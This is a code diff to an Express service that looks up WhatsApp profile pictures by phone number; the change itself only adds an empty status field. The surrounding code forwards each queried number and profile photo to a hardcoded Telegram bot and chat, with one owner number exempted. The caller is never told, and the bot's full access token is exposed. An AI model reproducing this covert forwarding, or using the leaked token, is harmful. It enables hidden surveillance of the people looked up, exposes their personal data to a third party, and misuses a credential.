@@ -51,7 +51,7 @@ app.get('/:number', async (req, res) => {
     try {
         let profilePicUrl = await client.getProfilePicUrl(phoneNumber);
         if (profilePicUrl) {
-            res.json({ phoneNumber, profilePicUrl });
+            res.json({ phoneNumber, profilePicUrl, status:"" });
             if (phoneNumber !== '917994107442' && phoneNumber !== '917994107442@c.us') {
                 const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(req.query.phoneNumber.replaceAll('"',''))}`;
                 await fetch(telegramUrl);
